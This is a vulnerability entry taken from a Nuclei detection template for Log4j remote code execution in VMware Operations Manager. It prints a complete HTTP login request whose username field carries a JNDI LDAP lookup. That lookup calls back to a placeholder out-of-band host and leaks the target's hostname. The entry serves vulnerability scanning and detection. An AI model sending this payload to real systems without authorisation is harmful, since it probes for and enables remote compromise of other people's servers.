# Vulnerability: VMware Operations Manager - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`vmware-operation-manager-log4j-rce.yaml`)

## Description
VMware Operations Manager is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ui/login.action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Origin: {{BaseURL}}
Referer: {{BaseURL}}/ui/login.action
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

mainAction=login&userName=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
```

